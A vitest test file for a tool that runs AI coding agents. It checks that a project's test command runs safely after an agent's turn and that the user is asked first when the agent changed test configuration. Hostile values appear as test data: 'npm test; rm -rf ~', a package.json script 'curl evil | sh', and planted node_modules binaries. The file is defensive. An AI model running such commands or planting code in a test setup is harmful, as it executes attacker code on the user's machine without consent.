import { afterEach, expect, it, vi } from 'vitest';
import { chmod, mkdir, mkdtemp, readFile, realpath, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { getPaths, preparePaths } from '../src/shared/paths.js';
import pty from 'node-pty';
import * as engines from '../src/daemon/engines.js';
import { Logger } from '../src/daemon/log.js';
import { SessionManager } from '../src/daemon/session-manager.js';
import { SettingsStore } from '../src/daemon/settings.js';
import { buildTestEnv } from '../src/daemon/env.js';
import { runTests } from '../src/daemon/test-run.js';
import { failingCount, isTestConfig, parseTestCommand, testCommandText, validateTestPlan, validateTestResult } from '../src/shared/test-run.js';
import type { SessionInfo } from '../src/shared/protocol.js';

// v0.7.4 auto-test (D55, on): a per-project test command, set once with /test-cmd. When an agent finishes a turn, it runs
// in the agent's worktree with a timeout, an output cap and an env without keys; the card says `✓ tests pass` or
// `✗ N failing`. If the agent's work changed the test command's config (package.json, test configs, Makefile and the
// like), AI Term asks first instead: running it would run code the agent wrote into the test setup without your OK.
const run = promisify(execFile), roots: string[] = [], managers: SessionManager[] = [];
afterEach(async () => { for (const m of managers.splice(0)) await m.shutdown(); vi.restoreAllMocks(); for (const root of roots.splice(0)) await rm(root, { recursive: true, force: true }); });
const ID = ['-c', 'user.name=Test', '-c', 'user.email=test@example.invalid', '-c', 'commit.gpgsign=false'];
const git = (cwd: string, ...args: string[]) => run('/usr/bin/git', [...ID, ...args], { cwd });
async function temp(): Promise<string> { const dir = await realpath(await mkdtemp(join(tmpdir(), 'ai-test-'))); roots.push(dir); return dir; }
async function setup(script = '#!/bin/sh\necho "Tests  2 failed | 5 passed"\nexit 1\n') {
  const dir = await temp(), repo = join(dir, 'repo'), home = join(dir, 'home');
  await mkdir(repo); await mkdir(home, { mode: 0o700 });
  await run('/usr/bin/git', ['init', '-q', '-b', 'main', '--', repo]);
  await writeFile(join(repo, 'package.json'), '{"scripts":{"test":"x"}}\n'); await writeFile(join(repo, 'check.sh'), script); await chmod(join(repo, 'check.sh'), 0o755);
  await git(repo, 'add', '--', '.'); await git(repo, 'commit', '-qm', 'initial', '--');
  const paths = getPaths(home); await preparePaths(paths);
  // The agent stays alive (a stub that waits), so its exit can't race the turn end the test simulates.
  const real = pty.spawn;
  vi.spyOn(pty, 'spawn').mockImplementation((_file, _args, options) => real('/bin/sh', ['-c', 'sleep 30'], { ...options, env: { PATH: '/usr/bin:/bin' } }));
  vi.spyOn(engines, 'checkEngine').mockResolvedValue({ installed: true, path: '/bin/sh', version: '1', loggedIn: true, authMethod: 'subscription' });
  const m = new SessionManager(paths, new Logger(paths.log)); managers.push(m); await m.load();
  const agent = await m.create({ engine: 'codex', model: 'gpt-test', auth: { kind: 'account' }, cwd: repo, permission: 'ask', title: 'fixer' });
  const live = (m as unknown as { sessions: Map<string, { info: SessionInfo }> }).sessions.get(agent.id);
  if (!live) throw new Error('no live'); live.info.status = 'done';
  return { dir, repo, home, m, agent, live, tree: agent.worktree ?? '' };
}
const result = (m: SessionManager, id: string) => m.list().find(s => s.id === id)?.tests;

it('parses a typed test command into an argument list (no shell), with quotes; refuses junk', () => {
  expect(parseTestCommand('npm test')).toEqual(['npm', 'test']);
  expect(parseTestCommand(`pytest -k "slow and not db" 'x y'`)).toEqual(['pytest', '-k', 'slow and not db', 'x y']);
  expect(parseTestCommand('npm test; rm -rf ~')).toEqual(['npm', 'test;', 'rm', '-rf', '~']);
  for (const bad of ['', '   ', 'npm "unclosed', 'a\u0007b', Array.from({ length: 40 }, () => 'x').join(' ')]) expect(parseTestCommand(bad)).toBeNull();
  expect(testCommandText(['pytest', '-k', 'a b'])).toBe("pytest -k 'a b'");
});

it('counts failing tests from the usual runners; null when it can\'t tell', () => {
  expect(failingCount(' Test Files  1 failed | 3 passed (4)\n      Tests  2 failed | 41 passed (43)')).toBe(2);
  expect(failingCount('Tests:       3 failed, 10 passed, 13 total')).toBe(3);
  expect(failingCount('  5 passing (20ms)\n  4 failing')).toBe(4);
  expect(failingCount('=========== 1 failed, 12 passed in 0.31s ===========')).toBe(1);
  expect(failingCount('--- FAIL: TestA (0.00s)\n--- FAIL: TestB (0.00s)\nFAIL')).toBe(2);
  expect(failingCount('test result: FAILED. 8 passed; 2 failed; 0 ignored')).toBe(2);
  expect(failingCount('\u001b[31mTests  7 failed\u001b[39m')).toBe(7);
  expect(failingCount('make: *** [test] Error 1')).toBeNull();
});

it('knows the files that configure a test run, and the command\'s own script', () => {
  for (const path of ['package.json', 'web/package.json', 'vitest.config.ts', 'jest.config.js', 'src/conftest.py', 'pyproject.toml', 'Makefile', '.npmrc', 'tox.ini', 'Cargo.toml', 'build.rs', '.cargo/config.toml', 'tsconfig.json', 'playwright.config.mjs', '.mocharc.yml', '.nvmrc', '.tool-versions'])
    expect(isTestConfig(path, ['npm', 'test']), path).toBe(true);
  for (const path of ['src/app.ts', 'tests/app.test.ts', 'README.md', 'docs/package.json.md']) expect(isTestConfig(path, ['npm', 'test']), path).toBe(false);
  expect(isTestConfig('scripts/test.sh', ['./scripts/test.sh'])).toBe(true);
  expect(isTestConfig('scripts/test.sh', ['npm', 'test'])).toBe(false);
});

it('the test env has no keys, tokens or AI Term variables; it keeps PATH and HOME and says CI', () => {
  const env = buildTestEnv({ PATH: '/usr/bin', HOME: '/Users/y', OPENAI_API_KEY: 'sk-x', ANTHROPIC_API_KEY: 'sk-ant-x', GITHUB_TOKEN: 'ghp_x', AWS_SECRET_ACCESS_KEY: 'x', AITERM_STATUS_TOKEN: 'x', AI_TERM_DEV: '1', NPM_TOKEN: 'x', DB_PASSWORD: 'x', JAVA_HOME: '/opt/java', GOPATH: '/go', VIRTUAL_ENV: '/v' });
  expect(env).toMatchObject({ PATH: '/usr/bin', HOME: '/Users/y', JAVA_HOME: '/opt/java', GOPATH: '/go', VIRTUAL_ENV: '/v', CI: '1' });
  expect(Object.keys(env).filter(name => /KEY|TOKEN|SECRET|PASSWORD|AITERM|AI_TERM/.test(name))).toEqual([]);
  expect(JSON.stringify(env)).not.toContain('sk-');
});

it('runs a command with argv only: pass, fail with a count, timeout kills its whole process group, output is capped', async () => {
  const dir = await temp(), env = buildTestEnv(process.env);
  const write = async (name: string, body: string) => { const path = join(dir, name); await writeFile(path, `#!/bin/sh\n${body}`); await chmod(path, 0o755); return path; };
  expect(await runTests([await write('ok.sh', 'echo fine\n')], dir, env, { timeoutMs: 10_000 })).toEqual({ state: 'pass' });
  expect(await runTests([await write('bad.sh', 'echo "  3 failing"\nexit 2\n')], dir, env, { timeoutMs: 10_000 })).toEqual({ state: 'fail', failing: 3 });
  expect(await runTests([await write('vague.sh', 'exit 1\n')], dir, env, { timeoutMs: 10_000 })).toEqual({ state: 'fail', failing: null });
  const marker = join(dir, 'child-alive');
  const started = Date.now();
  expect(await runTests([await write('slow.sh', `(sleep 3; touch ${marker}) &\nsleep 30\n`)], dir, env, { timeoutMs: 500 })).toEqual({ state: 'timeout' });
  expect(Date.now() - started).toBeLessThan(5_000);
  await new Promise(resolve => setTimeout(resolve, 3_500));
  await expect(readFile(marker)).rejects.toThrow();
  expect(await runTests([await write('loud.sh', 'yes "line of output" | head -c 6000000\necho "Tests  1 failed"\nexit 1\n')], dir, env, { timeoutMs: 20_000 })).toEqual({ state: 'fail', failing: 1 });
  expect(await runTests([join(dir, 'missing-program')], dir, env, { timeoutMs: 5_000 })).toEqual({ state: 'error' });
  const aborted = new AbortController(); setTimeout(() => aborted.abort(), 200);
  expect(await runTests([await write('long.sh', 'sleep 30\n')], dir, env, { timeoutMs: 20_000, signal: aborted.signal })).toEqual({ state: 'cancelled' });
}, 30_000);

it('/test-cmd is set once per project (your checkout), and the agent\'s turn end runs it in its worktree: ✗ 2 failing', async () => {
  const { repo, m, agent, tree } = await setup();
  expect(await m.testCommand(repo)).toEqual({ repo, command: null });
  expect(await m.setTestCommand(tree, ['./check.sh'])).toEqual({ repo, command: ['./check.sh'] });
  await m.afterTurn(agent.id);
  expect(result(m, agent.id)).toEqual({ state: 'fail', failing: 2 });
});

it('a turn whose work changed the test setup asks first instead of running (card: config changed · /test)', async () => {
  const { repo, home, m, agent, tree } = await setup('#!/bin/sh\ntouch ran-it\nexit 0\n');
  await m.setTestCommand(repo, ['./check.sh']);
  await writeFile(join(tree, 'package.json'), '{"scripts":{"test":"curl evil | sh"}}\n');
  await m.afterTurn(agent.id);
  expect(result(m, agent.id)).toEqual({ state: 'ask', changed: ['package.json'] });
  await expect(readFile(join(tree, 'ran-it'))).rejects.toThrow();
  // /test shows the plan; only the fingerprint of what was shown runs it.
  const plan = await m.testPlan(agent.id);
  expect(validateTestPlan(plan)).toMatchObject({ title: 'fixer', command: ['./check.sh'], cwd: tree, changed: ['package.json'] });
  await expect(m.runTestPlan(agent.id, 'f'.repeat(64))).rejects.toThrow('The test setup changed since it was shown; run /test again');
  await m.runTestPlan(agent.id, plan.fingerprint);
  await vi.waitFor(() => expect(result(m, agent.id)).toEqual({ state: 'pass' }));
  // Off in /settings: a turn end runs nothing.
  await new SettingsStore(home).set({ autoTest: false });
  await m.afterTurn(agent.id);
  expect(result(m, agent.id)).toEqual({ state: 'pass' });
});

it('the agent working again cancels a test run and clears the old result', async () => {
  const { repo, m, agent, live } = await setup('#!/bin/sh\nsleep 30\n');
  await m.setTestCommand(repo, ['./check.sh']);
  const ending = m.afterTurn(agent.id);
  await vi.waitFor(() => expect(result(m, agent.id)).toEqual({ state: 'running' }));
  (m as unknown as { cancelTests(id: string): void }).cancelTests(agent.id);
  await ending;
  expect(result(m, agent.id)).toBeUndefined();
  expect(live.info.tests).toBeUndefined();
});

it('the client accepts only the fixed result shapes', () => {
  for (const ok of [{ state: 'running' }, { state: 'pass' }, { state: 'fail', failing: 3 }, { state: 'fail', failing: null }, { state: 'timeout' }, { state: 'error' }, { state: 'ask', changed: ['package.json'] }])
    expect(validateTestResult(ok)).toEqual(ok);
  for (const bad of [{ state: 'pass', extra: 1 }, { state: 'fail' }, { state: 'fail', failing: -1 }, { state: 'ask', changed: ['\u001b[31mx'] }, { state: 'ask', changed: Array(30).fill('a') }, { state: 'nope' }])
    expect(() => validateTestResult(bad)).toThrow();
});

// ---- Part F review findings ----
it('HIGH (security review): ignored dependency folders the agent filled count as test setup; once you approve, later turns run until they change', async () => {
  const { repo, m, agent, tree } = await setup('#!/bin/sh\nexit 0\n');
  await writeFile(join(repo, '.gitignore'), 'node_modules/\n'); await git(repo, 'add', '--', '.gitignore'); await git(repo, 'commit', '-qm', 'ignore', '--');
  await git(tree, 'merge', '-q', '--ff-only', 'main');
  await m.setTestCommand(repo, ['./check.sh']);
  await mkdir(join(tree, 'node_modules', '.bin'), { recursive: true }); await writeFile(join(tree, 'node_modules', '.bin', 'vitest'), '#!/bin/sh\necho evil\n');
  await m.afterTurn(agent.id);
  expect(result(m, agent.id)).toEqual({ state: 'ask', changed: ['.gitignore', 'node_modules/ (ignored)'] });
  const plan = await m.testPlan(agent.id);
  await m.runTestPlan(agent.id, plan.fingerprint);
  await vi.waitFor(() => expect(result(m, agent.id)).toEqual({ state: 'pass' }));
  await m.afterTurn(agent.id);
  expect(result(m, agent.id)).toEqual({ state: 'pass' });
  await writeFile(join(tree, 'node_modules', '.bin', 'vitest'), '#!/bin/sh\necho more evil\n');
  await m.afterTurn(agent.id);
  expect(result(m, agent.id)).toEqual({ state: 'ask', changed: ['.gitignore', 'node_modules/ (ignored)'] });
});

it('MEDIUM (security review): a process that leaves the group (setsid) can\'t keep a run open past its limit', async () => {
  const dir = await temp(), started = Date.now();
  const outcome = await runTests(['/bin/sh', '-c', "perl -e 'use POSIX; POSIX::setsid(); sleep 20' & sleep 1; exit 0"], dir, buildTestEnv(process.env), { timeoutMs: 15_000 });
  // The command itself ended after a second; the escaped process can't keep the run open.
  expect(outcome).toEqual({ state: 'pass' });
  expect(Date.now() - started).toBeLessThan(6_000);
}, 20_000);

it('MEDIUM (TS review): a turn that starts while the turn end is checked gets no test run or result', async () => {
  const { repo, m, agent, live } = await setup('#!/bin/sh\nexit 0\n');
  await m.setTestCommand(repo, ['./check.sh']);
  const ending = m.afterTurn(agent.id);
  live.info.status = 'running';
  await ending;
  expect(result(m, agent.id)).toBeUndefined();
});

it('LOW (both reviews): every relative path word is the command\'s script; more setup names; 0 failing reads as unknown; /test-cmd refuses an unrecorded worktree folder', async () => {
  expect(isTestConfig('scripts/test.sh', ['bash', 'scripts/test.sh'])).toBe(true);
  expect(isTestConfig('run.js', ['node', './run.js'])).toBe(true);
  for (const path of ['.gitignore', 'go.work', '.pnp.cjs', '.yarn/releases/yarn-4.cjs', '.bundle/config', 'lib/sitecustomize.py', 'site/x.pth', 'deps.gradle']) expect(isTestConfig(path, ['npm', 'test']), path).toBe(true);
  expect(failingCount('test result: FAILED. 5 passed; 0 failed; 0 ignored')).toBeNull();
  const { home, m } = await setup();
  const stray = join(home, 'worktrees', 'other', 'x'); await mkdir(stray, { recursive: true }); await run('/usr/bin/git', ['init', '-q', '--', stray]);
  await expect(m.setTestCommand(stray, ['npm', 'test'])).rejects.toThrow("Set /test-cmd from your checkout; this folder is an agent's worktree AI Term has no record of");
});

// ---- Part F fix review ----
it('MEDIUM-HIGH (fix review): dependency files that are untracked, committed or inside any other ignored folder count too; a run keeps its own output approved', async () => {
  const { repo, m, agent, tree } = await setup('#!/bin/sh\nmkdir -p dist && date > dist/out.txt\nexit 0\n');
  await writeFile(join(repo, '.git', 'info', 'exclude'), 'dist/\n');
  await m.setTestCommand(repo, ['./check.sh']);
  await mkdir(join(tree, 'node_modules', '.bin'), { recursive: true }); await writeFile(join(tree, 'node_modules', '.bin', 'jest'), '#!/bin/sh\n');
  await m.afterTurn(agent.id);
  expect(result(m, agent.id)).toEqual({ state: 'ask', changed: ['node_modules/.bin/jest'] });
  const plan = await m.testPlan(agent.id); await m.runTestPlan(agent.id, plan.fingerprint);
  await vi.waitFor(() => expect(result(m, agent.id)).toEqual({ state: 'pass' }));
  // The run wrote ignored output (dist/ is ignored in this worktree): the next turn still runs by itself.
  await m.afterTurn(agent.id);
  expect(result(m, agent.id)).toEqual({ state: 'pass' });
});

it('MEDIUM (fix review): a link out of the worktree in an ignored folder always asks, even after an approval', async () => {
  const { dir, repo, m, agent, tree } = await setup('#!/bin/sh\nexit 0\n');
  await writeFile(join(repo, '.gitignore'), 'node_modules\n'); await git(repo, 'add', '--', '.gitignore'); await git(repo, 'commit', '-qm', 'ignore', '--'); await git(tree, 'merge', '-q', '--ff-only', 'main');
  await m.setTestCommand(repo, ['./check.sh']);
  const outside = join(dir, 'outside'); await mkdir(join(outside, '.bin'), { recursive: true });
  await symlink(outside, join(tree, 'node_modules'));
  await m.afterTurn(agent.id);
  expect(result(m, agent.id)).toMatchObject({ state: 'ask' });
  const plan = await m.testPlan(agent.id); await m.runTestPlan(agent.id, plan.fingerprint);
  await vi.waitFor(() => expect(result(m, agent.id)).toEqual({ state: 'pass' }));
  await writeFile(join(outside, '.bin', 'new'), '#!/bin/sh\n');
  await m.afterTurn(agent.id);
  expect(result(m, agent.id)).toMatchObject({ state: 'ask' });
});
